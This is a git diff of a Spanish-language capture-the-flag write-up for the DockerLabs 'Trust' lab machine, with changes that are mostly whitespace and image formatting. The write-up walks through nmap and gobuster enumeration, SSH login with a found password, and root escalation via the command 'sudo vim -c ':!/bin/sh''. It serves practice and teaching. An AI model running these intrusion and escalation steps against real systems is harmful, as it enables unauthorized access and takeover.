@@ -22,17 +22,17 @@ tags:
 Esta maquina está clasificada como "Muy Facil" en la plataforma de [DockerLabs](https://dockerlabs.es/#/), muy útil para practicar ataque de fuerza bruta.
 
 # Herramientas
-	nmap
-	hydra
+
+    nmap
+    hydra
 
 # 1- Enumeración
 
-Comenzamos con la etapa de enumeración para ello vamos a usar la herramienta nmap con los siguientes parámetros 
+Comenzamos con la etapa de enumeración para ello vamos a usar la herramienta nmap con los siguientes parámetros
 
 ```bash
 sudo nmap -p- --open -sS -sC -sV -n -Pn 172.17.0.2 -oN nmap.txt
 ```
-
 
 | Parametro | Descripción                        |
 | --------- | ---------------------------------- |
@@ -53,7 +53,7 @@ Host is up (0.0000080s latency).
 Not shown: 65533 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   256 19:a1:1a:42:fa:3a:9d:9a:0f:ea:91:7f:7e:db:a3:c7 (ECDSA)
 |_  256 a6:fd:cf:45:a6:95:05:2c:58:10:73:8d:39:57:2b:ff (ED25519)
 80/tcp open  http    Apache httpd 2.4.57 ((Debian))
@@ -68,7 +68,7 @@ Nmap done: 1 IP address (1 host up) scanned in 8.77 seconds
 
 Procedo a investigar el puerto 80 en el navegador ingreso la siguiente URL `http://172.17.0.2` en el cual está la pagina de por default del servicio Apache
 
-![](/assets/images/writetup/dockerlabs/trust/000trust.png)
+![[000trust.png]](/assets/images/writetup/dockerlabs/trust/000trust.png)
 
 La pagina no tiene nada mas interesante, por lo tanto procedo a realizar fuzzing web a ver si me encuentro con algo mas
 
@@ -83,6 +83,7 @@ gobuster dir -n 404 -t 64 -u http://172.17.0.2/ -w /usr/share/dirbuster/wordlist
 | -u        | URL                             |
 | -w        | Ruta al diccionario             |
 | -x        | Extensiones de archivo a buscar |
+
 Finalizado el fuzzing se observa que hay un directorio secret.php
 
 ```css
@@ -153,15 +154,16 @@ con estos datos procedo a realizar la intrusión en el equipo mediante el servic
 Conexión a la maquina victima por el servicio SSH
 
 ```bash
-ssh mario@172.17.0.2   
+ssh mario@172.17.0.2
 ```
 
 al solicitar la contraseña ingreso `chocolate` y me permite el acceso a la maquina victima con el usuario mario intrusión realizada
 
 ![]/assets/images/writetup/dockerlabs/trust/003trust.png
+
 # 3- Escalada de privilegios
 
-Llego de momento de escalar privilegios y ser el usuario root,  para ello voy a ejeutar el siguiente comando `sudo -l` para listar los permisos de sudo que tiene el usuario actual en el sistema.
+Llego de momento de escalar privilegios y ser el usuario root, para ello voy a ejeutar el siguiente comando `sudo -l` para listar los permisos de sudo que tiene el usuario actual en el sistema.
 
 ![]/assets/images/writetup/dockerlabs/trust/004trust.png
 
@@ -176,8 +178,3 @@ sudo vim -c ':!/bin/sh'
 Listo! se logró escalar privilegios a al usuario root
 
 ![]/assets/images/writetup/dockerlabs/trust/005trust.png
-
-
-
-
-
